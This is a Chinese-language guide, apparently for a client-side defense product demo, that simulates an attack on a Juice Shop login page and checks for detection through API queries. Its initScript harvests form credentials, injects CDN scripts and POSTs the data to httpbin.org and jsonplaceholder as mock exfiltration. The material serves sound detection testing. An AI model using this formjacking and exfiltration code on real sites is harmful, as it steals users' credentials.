階段 2 針對受保護的應用程式產生模擬攻擊流量，並確認 CSD 偵測到了它。階段 1 必須完成 — 所有步驟 7 檢查均 PASS — 才能繼續進行。

## 步驟 8：攻擊模擬

<Aside type="note">
此步驟需要瀏覽器端 JavaScript 執行 — `curl` 無法觸發 CSD 偵測。具有瀏覽器自動化工具的 AI 助手（MCP Chrome DevTools、Playwright、Puppeteer）使用下方的 **AI 自動化執行**序列直接執行這些步驟。沒有瀏覽器自動化的操作人員執行手動步驟。
</Aside>

基礎結構驗證完成後（所有階段 1 步驟 7 檢查均 PASS），執行攻擊模擬指令碼以產生 CSD 偵測。指令碼定義於[觸發偵測](/csd/trigger-detection/)指南和[攻擊指令碼庫](/csd/attack-scripts/)。

### AI 自動化執行

具有瀏覽器自動化工具的 AI 助手以程式設計方式執行攻擊模擬：

1. **使用 initScript 導航** — 首先導航至 `about:blank` 以確保乾淨的文件內容（避免來自先前導航的舊 initScript），然後使用包含 initScript 的 `navigate_page` 導航至 `http://$F5XC_DOMAINNAME/#/login`，該指令碼在 zone.js 修補本地 `setInterval`、`clearInterval`、`fetch` 和 `console.log` 之前保存它們，輪詢登入表單欄位，經由本地 `HTMLInputElement.prototype.value` 設定器填充認證，並立即以內聯方式執行組合偵測指令碼。使用下方的逐字 initScript。
2. **關閉歡迎橫幅** — 使用 `Escape` 鍵按下 `press_key` 以關閉歡迎橫幅。在後續訪問中，橫幅可能不會出現（Cookie 已保留）。Cookie 同意對話框由 Escape 鍵自動關閉
3. **等待完成** — 等待 10 秒以完成所有 CDN 指令碼載入/錯誤回呼和 fetch Promise 解決
4. **擷取證據** — `list_console_messages` 以檢查 `[CSD Demo] Simulation complete` 和 CDN 載入結果；`list_network_requests` 篩選至 `script` 和 `fetch` 類型以驗證 HTTP 狀態碼（成功時為 `200`/`201`、保留要求時為 `pending`）

**階段 2 initScript（逐字 — 完全按照所寫方式使用）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('#email');
  var passEl  = document.querySelector('#password');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

<Aside type="caution">
**zone.js 不相容性** — Juice Shop 使用 Angular 的 zone.js，它修補 `setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest` 和其他瀏覽器 API。這會破壞 MCP `evaluate_script`、`fill` 和 `click` 工具，顯示 `Cannot read properties of undefined (reading 'call')`。改用 `navigate_page` 搭配 `initScript` — `initScript` 在 zone.js 載入前執行，因此可以保存本地 API 參考並在輪詢回呼中使用它們。initScript 必須使用本地 `HTMLInputElement.prototype.value` 設定器填充表單欄位（而非 `fill`），並以內聯方式執行偵測指令碼（而非 `setTimeout`，zone.js 可能在頁面載入後攔截它）。詳見[觸發偵測 — AI 自動化執行](/csd/trigger-detection/#ai-automated-execution)。
</Aside>

<Aside type="note">
**initScript 積累** — 每個包含 `initScript` 參數的 `navigate_page` 呼叫都會將指令碼新增至持續清單，該清單在每個後續文件載入時執行。為避免舊指令碼造成干擾，請在執行之間導航至 `about:blank`，或使用包含 `isolatedContext` 的 `new_page` 取得乾淨的瀏覽器內容。
</Aside>

<Aside type="note">
**在 initScript 中保存本地 `fetch`** — initScript 在 zone.js 修補前保存 `window.fetch.bind(window)`。這確保 fetch 呼叫正常工作，不會出現 zone.js `Cannot read properties of undefined` 錯誤。相同的 initScript（已保存本地 `fetch`）用於階段 2 和階段 3 攻擊執行 — CSD 緩解不會攔截 `fetch()` 呼叫，因此保存本地參考不會影響緩解行為。
</Aside>

<Aside type="caution">
**瞬時源 404** — 首次導航至 Angular 應用程式時，`polyfills.js` 或其他應用程式指令碼可能會從源伺服器傳回瞬時 HTTP 404。這會導致 Angular 無法啟動，結果是顯示空白頁面且沒有登入表單。404 是短暫的 — 後續要求會傳回 200 或 304。**恢復：** 導航至 `about:blank`、等待 2 秒，然後重試導航。如果問題在多次重試後仍然存在，請經由負載均衡器路徑檢查源健康狀況（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
</Aside>

### 手動執行

沒有瀏覽器自動化工具的操作人員手動執行步驟：

1. **導航**至受保護的應用程式登入頁面：`http://xF5XC_DOMAINNAMEx/#/login`
2. **輸入虛擬認證** — 在 [電子郵件] 欄位中輸入 `test@example.com`，在 [密碼] 欄位中輸入 `P@ssword123`（不要提交表單）
3. **開啟 DevTools** — 按下 **F12** 並切換至 **Console** 索引標籤
4. **執行組合偵測指令碼** — 從[觸發偵測 &mdash; 執行組合模擬指令碼](/csd/trigger-detection/#run-the-combined-simulation-script)將指令碼貼入主控台並按下 Enter
5. **驗證主控台輸出** — 確認 `[CSD Demo]` 分階段輸出顯示：欄位收集、來自 4 個 CDN 網域的指令碼注入，以及向 2 個端點的資料外洩

### 觸發的項目

| 訊號 | 行為 | 偵測 |
| --- | --- | --- |
| 表單欄位收集 | 讀取電子郵件和密碼輸入值 | 指令碼讀取敏感表單欄位 — 標記為高風險 |
| 指令碼注入 | 從 `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io` 注入 4 個 `&lt;script&gt;` 標籤 | 偵測到最多 4 個新的第三方指令碼網域（CDN 可用性有所不同） |
| 資料外洩 | 經由 `fetch` 將收集的資料傳送至 `www.httpbin.org` 和 `jsonplaceholder.typicode.com` | 向外部網域的網路呼叫 |

<Aside type="note">
**CDN 可用性各不相同。** 並非所有 4 個 CDN 指令碼都會在每次執行時載入 — 瀏覽器資源限制、網路狀況或 CDN 節流可能會導致某些失敗，並顯示 `ERR_INSUFFICIENT_RESOURCES` 或逾時。如果**任何** CDN 指令碼載入，模擬就會成功。無論指令碼是否成功載入，CSD 都會偵測注入嘗試 — `&lt;script&gt;` 標籤建立本身就是偵測訊號。

在嚴重情況下，`ERR_INSUFFICIENT_RESOURCES` 可能會升級為頁面級失敗 — 整個頁面變為空白，螢幕擷取逾時，`take_snapshot` 失敗。這通常發生在相同瀏覽器內容中多次導航累積重型 initScript 之後。**恢復：** 使用包含 `isolatedContext` 的 `new_page` 建立全新的瀏覽器內容，然後從 `about:blank` → 使用 initScript 的 `navigate_page` 序列重試。這與單個 CDN 指令碼失敗不同，後者不會影響模擬成功。
</Aside>

<Aside type="tip">
執行攻擊模擬後，使用此確定性輪詢迴圈等待偵測：

1. 每 60 秒查詢一次 `/detected_domains`
2. 如果 DET-3 通過（外洩網域出現在 `/detected_domains`），立即進行步驟 9
3. 如果在 10 次查詢後（10 分鐘）仍為空，檢查 CSD 狀態（階段 1 步驟 5）和受保護網域登錄（階段 1 步驟 6）— 其中一項可能未正確設定
4. 如果在 30 次查詢後（30 分鐘）仍為空，停止並向操作人員報告 — 不要繼續進行階段 3

如需其他有針對性的模擬（個別攻擊類別、最大偵測壓力測試），請參閱[攻擊指令碼庫](/csd/attack-scripts/)。
</Aside>

### 證據

AI 助手應報告以下內容。對於 AI 自動化執行，證據由 `list_console_messages` 以程式設計方式擷取（initScript 的輪詢函式將結果記錄到主控台）。對於手動執行，操作人員讀取瀏覽器主控台輸出。

| 檢查 | 預期 | 狀態 |
| --- | --- | --- |
| 登入頁面已載入 | 在 `http://$F5XC_DOMAINNAME/#/login` 時 `200 OK` | PASS / FAIL |
| 主控台指令碼已執行 | 主控台輸出中的 `[CSD Demo] Simulation complete` | PASS / FAIL |
| 欄位已收集 | 主控台輸出中計數 > 0 | PASS |
| 指令碼已注入 | 主控台輸出中 1–4 個 CDN 網域（某些可能因資源錯誤而失敗） | 如果出現任何 CDN 網域則 PASS |
| 外洩通道 | 主控台輸出中 2 個 fetch POST 嘗試 | PASS |

<Aside type="tip">
如果 HTTPS LB 憑證有效（`CertificateValid`），可以選擇針對 `https://$F5XC_DOMAINNAME/#/login` 執行模擬。這不是演示進行的必要條件。
</Aside>

## 步驟 9：經由 API 的偵測驗證

查詢 CSD API 端點以確認偵測已出現。使用輪詢迴圈：每 60 秒查詢一次 `/detected_domains`；DET-3 通過後立即繼續。如果 DET-3 在 10 分鐘後未通過，檢查 CSD 設定。如果 DET-3 在 30 分鐘後未通過，停止並向操作人員報告。這些端點在[API 參考](/csd/api-reference/)中有文件記載，並使用與先前步驟相同的驗證和命名空間。

<Aside type="note">
**端點處理順序：** `/detected_domains` 首先填入，是 CSD 管道運作的主要指標。`/scripts` 和 `/formFields` 以較慢的後端處理排程填入，即使在多次模擬執行後可能仍保持空白 20–30 分鐘。如果 `/detected_domains` 顯示外洩網域（`www.httpbin.org`、`jsonplaceholder.typicode.com`），將模擬視為成功偵測並繼續 — 下方的 DET-1 檢查反映了這一點。
</Aside>

### 偵測到的指令碼

查詢過去 24 小時內偵測到的指令碼：

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s -X POST \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  -H "Content-Type: application/json" \
  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
```

| 欄位 | 預期 | 狀態 |
| --- | --- | --- |
| `total` | > 0（偵測到的指令碼） | 如果 > 0 則 PASS；如果 0 但 `/detected_domains` 顯示外洩網域則 PENDING |
| 指令碼名稱 | 在 `script_name` 中包括 CDN 網域（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`） | 如果注入的 CDN 網域出現則 PASS |

### 偵測到的網域

```bash
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
```

| 欄位 | 預期 | 狀態 |
| --- | --- | --- |
| `total_domains` | > 0 | 如果 > 0 則 PASS |
| 網域清單 | 包括 CDN 和外洩網域 | 如果預期網域出現則 PASS |

### 表單欄位

```bash
NOW=$(date +%s)
START=$(( NOW - 86400 ))
curl -s \
  -H "Authorization: APIToken xF5XC_API_TOKENx" \
  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
```

| 欄位 | 預期 | 狀態 |
| --- | --- | --- |
| `total` | > 0 | 如果 > 0 則 PASS；如果 0 但 DET-3 通過則 PENDING |
| `name` | 包括 `email`、`password` | 如果出現敏感欄位則 PASS |
| `sensitivity` | 電子郵件/密碼欄位為 `Sensitive` | 如果 ML 分類正確則 PASS |

<Aside type="note">
**表單欄位處理速度較域偵測慢。** `/formFields` 端點在首次查詢時可能傳回欄位且中繼資料不完整。ML 敏感度分類（`Sensitive` 對比 `Not Sensitive`）在後端處理完成後填入 — 這可能需要 20–30 分鐘後才能完成首次模擬執行。如果欄位顯示但缺少分類，稍後重新查詢。DET-3（`/detected_domains`）是主要通過條件。
</Aside>

### 階段 2 證據摘要

在所有偵測查詢後，提示最終偵測狀態：

| 測試 ID | 檢查 | 狀態 |
| --- | --- | --- |
| DET-1 | 偵測到的指令碼（`/scripts` 端點） | 如果 > 0 則 PASS；如果空但 DET-3 通過則 PENDING |
| DET-2 | 偵測到的 CDN 網域 | PASS / FAIL |
| DET-3 | 偵測到的外洩網域（`/detected_domains`） | **主要指標** — 如果出現 `www.httpbin.org` 或 `jsonplaceholder.typicode.com` 則 PASS |
| DET-4 | 偵測到的表單欄位（`/formFields` 端點） | 如果 > 0 則 PASS；如果空但 DET-3 通過則 PENDING |

<Aside type="note">
**進行階段 3 的最低通過條件：** DET-3 必須 PASS（外洩網域在 `/detected_domains` 中可見）。DET-1 和 DET-4 在首次使用或全新重建後可能顯示 PENDING — 這是正常的。如果 DET-3 在 30 分鐘後也顯示 FAIL，驗證 CSD 已啟用（階段 1 步驟 5）、受保護網域已登錄（階段 1 步驟 6）、CSD JS 標籤正在被注入（階段 1 步驟 7 JS 設定檢查）。
</Aside>
